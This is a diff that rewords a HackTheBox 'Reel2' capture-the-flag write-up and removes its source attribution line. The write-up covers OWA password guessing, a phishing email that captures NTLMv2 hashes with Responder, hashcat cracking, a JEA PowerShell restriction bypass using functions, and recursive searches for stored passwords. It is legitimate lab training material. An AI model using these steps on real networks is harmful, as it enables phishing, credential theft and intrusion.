@@ -6,14 +6,14 @@ points: 40
 rating: 4.6
 date: 2020-10-03
 avatar: assets/htb/reel2.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Reel2
 ---
+
 ## HTB - Reel2
 
 ### Overview
 
-This machine was not as difficult in some respects as other Hard-difficulty machines, but the way that the machine was realistically hardened made it more challenging.  The use of some newer Windows PowerShell hardening techniques, as well as ensuring authentication was required in a key location put this machine into the "hard" category.  The path to root was otherwise rather straightforward, and just required simple attention to detail and some research to keep moving forward.
+In some ways this box was less demanding than other Hard-rated machines, but the realistic hardening applied to it raised the difficulty. Modern Windows PowerShell lockdown techniques, combined with enforcing authentication at a critical spot, are what pushed it into the "hard" bracket. Aside from that, the road to root was fairly linear and mostly came down to careful observation and a bit of reading.
 
 ## Useful Skills and Tools
 
@@ -25,7 +25,7 @@ Using PowerShell:
 dir -r C:\ -EA Silent | Select-String "Password"
 ```
 
-This searches through files in the entire C:\ drive, silently ignoring errors, and selecting any that contain the word "Password" in them.
+This recursively walks the whole C:\ drive, quietly suppressing errors, and returns any file containing the string "Password".
 
 ### **Mount an existing folder to a new drive letter** 
 
@@ -37,7 +37,7 @@ Name           Used (GB)     Free (GB) Provider      Root                       
 D                                      FileSystem    C:\Users 
 ```
 
-This will mount the entire`/Users` folder from the  `C:\` drive to the drive letter `D:\`.  You can then access the user's folders as seen below:
+This maps the whole `/Users` folder off the `C:\` drive onto the `D:\` drive letter. From there you can browse the user directories as shown below:
 
 ```text
 cd D:\Administrator
@@ -47,7 +47,7 @@ cd D:\Administrator
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are:
+I kicked off enumeration with an nmap scan against `<YOUR_IP>`. The flags I typically rely on are:
 
 | `Flag` | Purpose |
 | :--- | :--- |
@@ -164,69 +164,69 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 241.37 seconds
 ```
 
-My nmap scan showed lots of TCP ports open.  I saw 80 - HTTP, 443 - HTTPS, 8080 - HTTP, 5985 - Windows Remote Management, and RPC on a bunch of ports 6000+.
+The scan revealed a large number of open TCP ports: 80 - HTTP, 443 - HTTPS, 8080 - HTTP, 5985 - Windows Remote Management, and RPC spread across many ports above 6000.
 
-From the nmap scan I also saw a DNS domain name `Reel2.htb.local` in the port 443 information. I added this domain to `/etc/hosts` and proceeded with my enumeration.
+The port 443 output also exposed the DNS name `Reel2.htb.local`. I dropped that entry into `/etc/hosts` and carried on enumerating.
 
 ### Port 80 - HTTP
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-80-forbidden.png)
+![](assets/wu/reel2/img-1.png)
 
-I opened a web browser and navigated to `http://reel2.htb.local`, but this simply led to a 403 - Forbidden error page.  I also ran a dirbuster scan in the background but found nothing useful.
+Browsing to `http://reel2.htb.local` only returned a 403 - Forbidden page. I also kicked off a dirbuster scan in the background, but it turned up nothing worthwhile.
 
 ### Port 8080 - HTTP
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-wallstant.png)
+![](assets/wu/reel2/img-2.png)
 
-Trying the same for port 8080 led to a login page for something called "WallStant".  It looked like some kind of social media site.
+Doing the same on port 8080 brought up a login page for something named "WallStant", which appeared to be a social media platform.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-wallstant-signup.png)
+![](assets/wu/reel2/img-3.png)
 
-I created an account after clicking on the "Sign Up" button.
+I clicked "Sign Up" and registered an account.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-wallstant-in.png)
+![](assets/wu/reel2/img-4.png)
 
-After logging in I found myself in something that looked like an old version of Facebook.
+Once logged in, the interface resembled an older Facebook clone.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-wallstant-edit.png)
+![](assets/wu/reel2/img-5.png)
 
-I saw a link for editing my profile. I was hoping for the ability to upload a profile picture, but unfortunately it did not seem to actually be an option.
+There was a profile-edit link. I was hoping to find a profile-picture upload, but no such option appeared to exist there.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-wallstant-photo.png)
+![](assets/wu/reel2/img-6.png)
 
-I found the option I was looking for on my 'test' user's profile page.  There was an upload button for changing the profile and banner images.  First I tested it by uploading one of my enumeration screenshots.
+I located the upload feature on my 'test' user's profile page, where a button let me change the profile and banner images. To test it, I first uploaded one of my enumeration screenshots.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-wallstant-nophoto.png)
+![](assets/wu/reel2/img-7.png)
 
-After validating that I could indeed upload files, I tried to upload a PHP code exec script \(though I wasn't  sure if PHP even ran here...\) but the file had to be an image.  I was able to upload a photo, so next I loaded Burp to see if I could fool it into loading code.
+Having confirmed uploads worked, I attempted to push a PHP code-execution script \(unsure if PHP even ran on this endpoint\), but the upload was restricted to images. Since a photo went through fine, I turned to Burp to see if I could trick it into accepting code.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-burp-php.png)
+![](assets/wu/reel2/img-8.png)
 
-I was able to upload my disguised PHP file, but I couldn't get code execution.  I did notice that the response contained the `X-Powered-By` header that told me that it was using PHP/7.2.32, so I checked to see if I could find any vulnerabilities associated with that version.
+My disguised PHP file uploaded successfully, yet I couldn't trigger execution. I did spot the `X-Powered-By` header in the response revealing PHP/7.2.32, so I went looking for vulnerabilities tied to that release.
 
 * [https://snyk.io/vuln/SNYK-DEBIAN10-CURL-573151](https://snyk.io/vuln/SNYK-DEBIAN10-CURL-573151)
 * [https://www.cvebase.com/cve/2020/8177](https://www.cvebase.com/cve/2020/8177)
 * [https://hackerone.com/reports/887462](https://hackerone.com/reports/887462)
 
-I found a number of vulnerabilities associated with this version, including one that pointed to a version of curl that is included that could lead to code execution using the `-J` flag is used to overwrite a local file
+Several vulnerabilities matched this version, among them a bundled curl flaw that could allow code execution when the `-J` flag overwrites a local file.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-php-vuln.png)
+![](assets/wu/reel2/img-9.png)
 
-Unfortunately, after reading the HackerOne report it seemed as if it was not useful in this case unless I could somehow make requests from the machine using curl \(not libcurl\).
+After reading the HackerOne report, though, it became clear this wasn't usable here unless I could get the box to issue requests via the curl binary itself \(not libcurl\).
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-wallstant-3posts.png)
+![](assets/wu/reel2/img-10.png)
 
-Back on the Wallstant page there was a "Trending Posts" box that had three potential usernames \(and I saw that one of my XXS tests was trending!\). I wondered what a 'fika\` was, so I looked it up.
+Back on the Wallstant site, a "Trending Posts" box listed three possible usernames \(and one of my XXS tests had made it into the trends!\). Curious what a 'fika\` was, I looked it up.
 
 * [https://www.swedishfood.com/fika](https://www.swedishfood.com/fika) 
 
 > fika is a traditional Swedish coffee break with friends
 
-I wrote it down as a potential partial password and continued on.
+I noted it as a possible piece of a password and moved on.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-wallstant-users.png)
+![](assets/wu/reel2/img-11.png)
 
-The other trending Pages tab contained more potential usernames.
+The other trending Pages tab held additional candidate usernames.
 
 ```text
 -- phpMyAdmin SQL Dump
@@ -239,41 +239,41 @@ The other trending Pages tab contained more potential usernames.
 -- PHP Version: 7.3.9
 ```
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-database.png)
+![](assets/wu/reel2/img-12.png)
 
-Dirbuster found a `/_database` folder which contained a `wallstant.sql` SQL database.
+Dirbuster turned up a `/_database` folder holding a `wallstant.sql` SQL dump.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-database-sn.png)
+![](assets/wu/reel2/img-13.png)
 
-There was not much useful information other than version numbers.
+Aside from version numbers, it didn't contain anything useful.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-wallstant-report1.png)
+![](assets/wu/reel2/img-14.png)
 
-Report a problem? Sure I was having a problem with accessing your machine, could you let me in?
+Report a problem? Sure, my problem was getting into your machine, so could you let me in?
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-wallstant-report.png)
+![](assets/wu/reel2/img-15.png)
 
-I wasn't able to get this to connect back to my machine, though. After testing for XSS, SQLi, and doing other tests in each of the input fields, there did not seem to be much else I could do here. I decided to see if there was anything useful on port 443.
+I couldn't get this to call back to my box, though. Having tested every input field for XSS, SQLi, and the rest with nothing to show for it, I figured there was little more to do here and moved on to check port 443.
 
 ### Port 443 - HTTPS
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-443-cert.png)
+![](assets/wu/reel2/img-16.png)
 
-I checked out the certificate, but other than the domain name I had already discovered there was no useful information.
+I inspected the certificate, but beyond the domain name I'd already found, it offered nothing useful.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-443-iis.png)
+![](assets/wu/reel2/img-17.png)
 
-The HTTPS port only led to a blank IIS Welcome page. I loaded Dirbuster again to see if there was anything other than the index page.
+The HTTPS port just served an empty IIS Welcome page. I ran Dirbuster once more to look for anything beyond the index page.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-dirbuster-owa.png)
+![](assets/wu/reel2/img-18.png)
 
-Dirbuster quickly returned a few folders, including `public` and `owa`. Both sounded interesting, so I loaded public first.
+Dirbuster soon surfaced a handful of folders, notably `public` and `owa`. Both looked promising, so I opened public first.
 
 ### Getting OWA credentials
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-443-owa.png)
+![](assets/wu/reel2/img-19.png)
 
-Navigating to `https://Reels.htb.local/public` redirected to an Outlook Web Application login page. Since I had a list of names to make usernames from, I decided to try to brute force the login. Searching for OWA brute force led to a tool by `byt3bl33d3r`. 
+Going to `https://Reels.htb.local/public` redirected me to an Outlook Web Application login. With a list of names to build usernames from, I figured I'd try brute forcing the login. A search for OWA brute force pointed me to a tool from `byt3bl33d3r`. 
 
 * [https://github.com/byt3bl33d3r/SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit)
 
@@ -285,7 +285,7 @@ Navigating to `https://Reels.htb.local/public` redirected to an Outlook Web Appl
     Do some recon and pass the custom OWA URL as the target if you really want the internal domain name, password spraying can still continue though :)
 ```
 
-The first time I ran the tool it gave me a very helpful error message that explained I needed to use the full internal custom URL.  I looked up how to find the custom OWA URL, and found what I was looking for in Microsoft's Exchange documentation.
+On the first run the tool returned a helpful error telling me I needed the full internal custom URL. I researched how to locate the custom OWA URL and found the answer in Microsoft's Exchange documentation.
 
 * [https://docs.microsoft.com/en-us/Exchange/architecture/client-access/autodiscover?view=exchserver-2019](https://docs.microsoft.com/en-us/Exchange/architecture/client-access/autodiscover?view=exchserver-2019)
 
@@ -296,52 +296,52 @@ The first time I ran the tool it gave me a very helpful error message that expla
 > * Autodiscover redirect URL for redirection: [http://autodiscover.contoso.com/autodiscover/autodiscover.xml](http://autodiscover.contoso.com/autodiscover/autodiscover.xml)
 > * Search for DNS SRV record
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-owa-autodiscovery.png)
+![](assets/wu/reel2/img-20.png)
 
-I tried to access `autodiscover/Autodiscover.xml`, but I kept having errors and was required to login to access it.  This also prevented the OWA brute force tool from enumerating the machine.  
+I attempted to reach `autodiscover/Autodiscover.xml`, but it kept erroring and demanding a login. That same requirement also stopped the OWA brute force tool from enumerating the host.  
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-owa-broken.png)
+![](assets/wu/reel2/img-21.png)
 
-The night I was doing this machine I kept getting crashes from the OWA web app and all sorts of other problems, including the portal being extremely slow.  I am not sure if this is normal on this machine or if it was being overly taxed by other users.
+While working the box that night, the OWA web app kept crashing and acting up in various ways, including the portal running painfully slow. I can't say whether that's typical for this machine or whether other players were overloading it.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-owa-broken2.png)
+![](assets/wu/reel2/img-22.png)
 
-These errors made me rethink brute-forcing the portal.  Since it seemed like other users were also pounding the server, I reset the machine and looked around a bit more to see if I had missed something.
+These errors made me reconsider brute forcing the portal. Suspecting other users were also hammering the server, I reset the machine and poked around some more in case I'd overlooked anything.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-wallstant-fika.png)
+![](assets/wu/reel2/img-23.png)
 
-I checked each profile page for clues for the password to log in.  I tried combinations of fika + 2020 etc.  For the username I tried different combinations of username, first name, and last name.
+I went through each profile page hunting for password clues, trying combinations like fika + 2020 and so on. For the username I cycled through various mixes of username, first name, and last name.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-wallstant-svenson.png)
+![](assets/wu/reel2/img-24.png)
 
-Next I tried combinations of summer + 2020.  
+Next I worked through combinations of summer + 2020.  
 
 ### The OWA Portal
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-owa-login.png)
+![](assets/wu/reel2/img-25.png)
 
-After a lot of tries, I was able to log into the OWA with the credentials `HTB\s.svenson:Summer2020`. 
+After many attempts, I finally logged into OWA with the credentials `HTB\s.svenson:Summer2020`. 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-owa-loggedin.png)
+![](assets/wu/reel2/img-26.png)
 
-The first thing I noticed was that the page was in Swedish, but since I have used OWA before it was not much of a problem. There was no mail, notes, contacts, or anything to look through.
+I immediately noticed the page was in Swedish, but having used OWA before that wasn't much of an obstacle. There was no mail, no notes, no contacts, nothing to dig through.
 
 * [https://www.ired.team/offensive-security/initial-access/netntlmv2-hash-stealing-using-outlook](https://www.ired.team/offensive-security/initial-access/netntlmv2-hash-stealing-using-outlook)
 * [https://insights.sei.cmu.edu/cert/2018/04/automatically-stealing-password-hashes-with-microsoft-outlook-and-ole.html](https://insights.sei.cmu.edu/cert/2018/04/automatically-stealing-password-hashes-with-microsoft-outlook-and-ole.html)
 
-After searching for awhile for ways to steal information through Outlook, I found a few articles that explained how to get NTLMv2 hashes by sending a link to the attackers box and having the email simply viewed in the Preview Pane.
+After hunting for ways to exfiltrate information through Outlook, I came across a few articles describing how to capture NTLMv2 hashes by emailing a link to the attacker's box, triggered simply by the message being shown in the Preview Pane.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-owa-addressbook.png)
+![](assets/wu/reel2/img-27.png)
 
-I opened the address book, and saw a long list of addresses available. I selected all them and clicked on the button to send a new email. 
+I opened the address book and found a long list of addresses. I selected all of them and hit the button to compose a new email. 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-owa-popup.png)
+![](assets/wu/reel2/img-28.png)
 
-I received an error from Firefox saying popups had been blocked, but clicking "Ja" \(Yes\) in the dialog box allowed the new mail window to open.
+Firefox warned that popups were blocked, but clicking "Ja" \(Yes\) in the dialog let the new mail window open.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-owa-phish2.png)
+![](assets/wu/reel2/img-29.png)
 
-I used Google translate to send an email inviting everyone to check out the new NAS link, which was a link to my machine. I tried sending as both a web link and as an SMB share just in case.  After that I fired up `Responder` to see what I could catch.
+Using Google Translate, I sent an email inviting everyone to view the new NAS link, which actually pointed at my machine. To cover my bases I sent it both as a web link and as an SMB share. Then I started `Responder` to see what would come in.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/reel2]
@@ -404,7 +404,7 @@ I used Google translate to send an email inviting everyone to check out the new 
 [HTTP] NTLMv2 Hash     : k.svensson::htb:85ab412763d672f9:83648271C68CBDA4E17F73B1EF3CD357:0101000000000000D97F28DCB804D7017D151A1EDFF498E3000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000000000000400000C4BECD0E51B4B90084B5CB9F237CDCDD2221F1DA0BE28E374F512A2DF5FA7A400A001000000000000000000000000000000000000900200048005400540050002F00310030002E00310030002E00310035002E00310033000000000000000000
 ```
 
-After a short time I got a hit, with the NTLMv2 hash for the user `k.svensson`.
+Before long I got a hit: the NTLMv2 hash for the user `k.svensson`.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/reel2]
@@ -414,7 +414,7 @@ After a short time I got a hit, with the NTLMv2 hash for the user `k.svensson`.
    1000 | NTLM                                             | Operating System
 ```
 
-Using hashcat's help I was able to identify the type id of the hash as 5600.
+From hashcat's help output I identified the hash mode as 5600.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/reel2]
@@ -471,7 +471,7 @@ Started: Tue Feb 16 19:02:30 2021
 Stopped: Tue Feb 16 19:02:58 2021
 ```
 
-I was able to crack the hash in just a few seconds. `k.svensson`'s password was `kittycat1`.  
+The hash fell in just a few seconds. `k.svensson`'s password turned out to be `kittycat1`.  
 
 ## Initial Foothold
 
@@ -483,14 +483,14 @@ Evil-WinRM shell v2.3
 
 Info: Establishing connection to remote endpoint
 
-[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mThe term 'Invoke-Expression' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.    + CategoryInfo          : ObjectNotFound: (Invoke-Expression:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException> ls
+*Evil-WinRM* PS The term 'Invoke-Expression' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.    + CategoryInfo          : ObjectNotFound: (Invoke-Expression:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException> ls
 The term 'Invoke-Expression' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
     + CategoryInfo          : ObjectNotFound: (Invoke-Expression:String) [], CommandNotFoundException
     + FullyQualifiedErrorId : CommandNotFoundException
-[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mThe term 'Invoke-Expression' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.    + CategoryInfo          : ObjectNotFound: (Invoke-Expression:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException>
+*Evil-WinRM* PS The term 'Invoke-Expression' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.    + CategoryInfo          : ObjectNotFound: (Invoke-Expression:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException>
 ```
 
-I was able to connect with `Evil-WinRM` using the credentials for `k.svensson:kittycat1` but the shell I got did not seem to be working properly. The `Invoke-Expression` cmdlet that `Evil-WinrM` relies on seemed to be blocked, so I loaded PowerShell for Linux instead.  
+I managed to connect via `Evil-WinRM` using `k.svensson:kittycat1`, but the resulting shell behaved oddly. It looked like the `Invoke-Expression` cmdlet that `Evil-WinrM` depends on was blocked, so I switched to PowerShell for Linux instead.  
 
 * [https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.1](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.1)
 * [https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.1](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.1)
@@ -517,17 +517,15 @@ Password for user HTB\k.svensson: *********
 PS /home/kac0/htb/reel2> Enter-PSSession $newSession
 ```
 
-I was able to login after using `pwsh` and PowerShell remoting.
+Using `pwsh` together with PowerShell remoting let me log in.
 
-{% hint style="info" %}
-NOTE: If you get the below error, close PowerShell, then install **`gss-ntlmssp`**. This will allow you to use NTLM authentication.
+NOTE: If you hit the error below, close PowerShell and install **`gss-ntlmssp`**. That enables NTLM authentication.
 
 ```text
 New-PSSession: [<YOUR_IP>] Connecting to remote server <YOUR_IP> failed with the following error message : acquiring creds with username only failed Unspecified GSS failure.  Minor code may provide more information SPNEGO cannot find mechanisms to negotiate For more information, see the about_Remote_Troubleshooting Help topic.
 ```
 
 * [https://www.reddit.com/r/PowerShell/comments/6itek2/powershell\_remoting\_linux\_windows\_with\_spnego/dj9auuq/](https://www.reddit.com/r/PowerShell/comments/6itek2/powershell_remoting_linux_windows_with_spnego/dj9auuq/) 
-{% endhint %}
 
 ```text
 [<YOUR_IP>]: PS>whoami /all
@@ -538,14 +536,14 @@ and try again.
     + FullyQualifiedErrorId : CommandNotFoundException
 ```
 
-I tried using the `whoami` command to find out what groups and permissions I had access to, but it didn't seem to be able to available.  This was another bad sign, after so many other locked down things.
+I tried `whoami` to enumerate my groups and permissions, but the command wasn't available. That was yet another bad sign after all the other lockdowns.
 
 ```text
 [<YOUR_IP>]: P> function test {whoami}   
 htb\k.svensson
 ```
 
-After some testing, I discovered I could run commands embedded inside a custom function.
+After some experimentation, I found I could execute commands by wrapping them in a custom function.
 
 ```text
 [<YOUR_IP>]: PS>function test {whoami /all}
@@ -587,11 +585,11 @@ User claims unknown.
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 
-This seemed to be pretty well locked down as well.  There wasn't much to work with in this user's groups or permissions.  
+This too looked fairly locked down. The user's groups and privileges gave me little to work with.  
 
 * [https://vexx32.github.io/2018/10/26/Anonymous-Functions/](https://vexx32.github.io/2018/10/26/Anonymous-Functions/)
 
-I found a shortcut for running commands inside short functions like this by using anonymous functions.
+I came across a shortcut for running commands in brief functions like this using anonymous functions.
 
 ```text
 [<YOUR_IP>]: P> .{ls}
@@ -605,17 +603,17 @@ d-----        7/30/2020   5:14 PM                WindowsPowerShell
 -a----        7/31/2020  11:58 AM           2564 jea_test_account.pssc
 ```
 
-This made navigating much easier since I only had to type a few characters more than typing the commands normally.  
+This made navigation far easier, since it only added a couple of characters over typing the commands directly.  
 
 ### JEA - Just Enough Administration
 
-Inside the `C:\Users\k.svensson\Documents` directory I found a couple of files related to some sort of test account.  I googled the `jea_test_account.psrc` file and found that is related to "Just Enough Administration", which after a little research I was able to find the Microsoft documentation that described it.
+In `C:\Users\k.svensson\Documents` I found a couple of files referencing some kind of test account. Searching the `jea_test_account.psrc` file led me to "Just Enough Administration", and a little digging surfaced the Microsoft documentation describing it.
 
 * [https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/role-capabilities?view=powershell-7.1](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/role-capabilities?view=powershell-7.1)
 
 > A role capability is a PowerShell data file with the .psrc extension that lists all the cmdlets, functions, providers, and external programs that are made available to connecting users.
 
-This is the file that seems to be limiting the commands that are available when I logged in. This is also why `Evil-Winrm` broke, since it seems to use `Invoke-Expression` for all of its commands. I have bypassed similar restrictions by using functions before, so that is how what I tried here worked.
+This file appears to be what restricts the commands available after login. It also explains why `Evil-Winrm` failed, since it relies on `Invoke-Expression` for everything. I'd bypassed similar restrictions with functions in the past, which is exactly the approach that worked here.
 
 ```text
 CommandType Name Version Source
@@ -630,11 +628,11 @@ Function Out-Default
 Function Select-Object
 ```
 
-I checked the list of currently available commands, and was given a very limited set. This is how JEA limits users. However it explicitly says on the documentation page:
+Checking the list of available commands returned a very small set, which is how JEA constrains users. However, the documentation page explicitly states:
 
 > For more complex command invocations that make this approach difficult, consider using implicit remoting or creating custom functions that wrap the functionality you require.
 
-When I ran `Get-Command` again inside my custom function, the list kept going and going. It seemed like I was able to use the full gamut of commands inside a function, but very few in the normal session.
+When I ran `Get-Command` inside my custom function, the list went on and on. It looked like I had access to the full range of commands within a function, but only a handful in the normal session.
 
 #### JEA Security Considerations
 
@@ -642,7 +640,7 @@ When I ran `Get-Command` again inside my custom function, the list kept going an
 
 > One of the core principles of JEA is that it allows non-admins to do some admin tasks. JEA doesn't protect against users who already have administrator privileges. Users who belong **Domain Admins**, local **Administrators**, or other highly privileged groups can circumvent JEA's protections via another means. For example, they could sign in with RDP, use remote MMC consoles, or connect to unconstrained PowerShell endpoints. Also, local admins on a system can modify JEA configurations to allow additional users or change a role capability to extend the scope of what a user can do in their JEA session. It's important to evaluate your JEA users' extended permissions to see if there are other ways to gain privileged access to the system.
 
-Now if only I could gain access to an Administrator account...
+If only I could get my hands on an Administrator account...
 
 ### User.txt
 
@@ -662,13 +660,13 @@ d-----        2/12/2021   5:12 PM                WinDirStatPortable
 88fe************************20de
 ```
 
-On `k.svensson`'s Desktop I found the `user.txt` proof file.
+The `user.txt` proof file was sitting on `k.svensson`'s Desktop.
 
 ## Path to Power \(Gaining Administrator Access\)
 
 ### Enumeration as k.svensson
 
-On the desktop I also saw a link for the sticky notes program, which seemed like a good place to search for secrets.  I searched the user's folder for any files that referenced "sticky" to see what I could find.
+The desktop also held a shortcut to the sticky notes program, which struck me as a likely spot for stored secrets. I searched the user's folder for any files mentioning "sticky" to see what would turn up.
 
 ```text
 [<YOUR_IP>]: PS>.{dir -r C:\Users\k.svensson\ -EA Silent | Select-String "sticky"}
@@ -700,17 +698,15 @@ ta\Local\Programs\stickynotes\stickynotes.exe
 ickynotes
 ```
 
-The Sticky Notes application was installed in `%USERPROFILE%\AppData\Local\Programs\stickynotes\`. This seemed like a likely place for the user to have stored interesting information, such as potential credentials.
+The Sticky Notes app lived in `%USERPROFILE%\AppData\Local\Programs\stickynotes\`. That seemed a plausible place for the user to have tucked away interesting data such as credentials.
 
-{% hint style="info" %}
-NOTE: I lost my shell at one point so it hung on any commands. If you get the below error after a hung PowerShell PSSession, use the shortcut Ctrl-L to exit and return to your local prompt.
+NOTE: At one point I lost my shell and it hung on every command. If you hit the error below after a stuck PowerShell PSSession, press Ctrl-L to bail out and return to your local prompt.
 
 ```text
 [<YOUR_IP>]: PS>Starting a command on the remote server failed with the following error message : ERROR_WSMAN_INVALID_SELECTORS: The WS-Management service cannot process the request because the request contained invalid selectors for the resource.  For more information, see the about_Remote_Troubleshooting Help topic.
 ```
 
-Results may vary with this. For me, it did not fully work, and I had to kill the terminal entirely.
-{% endhint %}
+Your mileage may vary. In my case it didn't fully work, and I ended up killing the terminal outright.
 
 ```text
 [<YOUR_IP>]: P> .{Get-ComputerInfo}                                                                 
@@ -753,9 +749,9 @@ DeviceGuardCodeIntegrityPolicyEnforcementStatus         :
 DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus :
 ```
 
-I was denied using the `systeminfo` command, but `Get-ComputerInfo` gave me a little bit of information. The platform was running on Windows Server 2012 R2
+The `systeminfo` command was blocked, but `Get-ComputerInfo` gave me a bit of detail. The host was running Windows Server 2012 R2
 
-There didn't seem to be anything in the `Appdata\Local\stickynotes\` folder of use, so I checked `Roaming` to see if there was anything useful there
+The `Appdata\Local\stickynotes\` folder held nothing useful, so I moved on to `Roaming` to see what was there
 
 ```text
 [<YOUR_IP>]: PS>.{cd ../../../Roaming}
@@ -784,7 +780,7 @@ d-----        7/30/2020   1:19 PM                logs
 -a----        7/30/2020   1:23 PM            159 Network Persistent State
 ```
 
-There were a number of files and folders that looked interesting in this folder.  I tried searching for a database or storage file where the notes may have been contained.
+This folder contained several interesting-looking files and directories. I went looking for a database or storage file that might hold the notes themselves.
 
 ```text
 [<YOUR_IP>]: PS>.{cd logs}       
@@ -816,11 +812,11 @@ Mode                LastWriteTime         Length Name
 -a----        7/30/2020   1:19 PM             41 MANIFEST-000001
 ```
 
-Inside the `\stickynotes\Local Storage` folder there was a `leveldb` folder. After searching for `leveldb` I discovered it was a type of local database, and not related to the Sticky Notes program \(at least not in Microsoft's set up\).  It seemed like this was a custom database setup.
+Inside `\stickynotes\Local Storage` sat a `leveldb` folder. Looking up `leveldb` revealed it was a local database format unrelated to the Sticky Notes program \(at least not in Microsoft's version\), suggesting this was a custom setup.
 
 * [https://livebook.manning.com/book/cross-platform-desktop-applications/chapter-12/15](https://livebook.manning.com/book/cross-platform-desktop-applications/chapter-12/15)
 
-I did some research to see if I could find out anything about this kind of custom set up for this program, and found that there was a community of people who preferred the old Sticky Notes program, and worked out ways to install and run it locally.  It looked possible that this project had been implemented here.
+Researching this kind of custom configuration, I learned there's a community that prefers the old Sticky Notes program and has figured out how to install and run it locally. It seemed plausible that such a project had been deployed here.
 
 ```text
 [<YOUR_IP>]: P> .{type Log.old}
@@ -829,7 +825,7 @@ I did some research to see if I could find out anything about this kind of custo
 2021/02/12-16:58:37.479 5956 Reusing old log leveldb/000003.log
 ```
 
-First I checked `Log.old` to see if there was anything useful, but it just pointed towards the other log file `000003.log`in the same directory.
+I checked `Log.old` first, but it merely pointed to the other log file, `000003.log`, in the same directory.
 
 ```text
 [<YOUR_IP>]: PS>.{type 000003.log}
@@ -900,13 +896,13 @@ First I checked `Log.old` to see if there was anything useful, but it just point
                                                                                               —´¦ÏÉÁÆÚapp://.__storejs__test__
 ```
 
-One string stuck out in this log:
+One string in this log jumped out at me:
 
 ```text
 "<p>Credentials for JEA</p><p>jea_test_account:Ab!Q@vcg^%@#1</p>"
 ```
 
-It looked like I had found a password for the `jea_test_account` I had seen files referencing earlier.  I tried logging into this account like I did with `k.svensson`, but it failed to authenticate.  I did some research on how to use PowerShell remoting with JEA, and again found that Microsoft's documentation was very helpful.
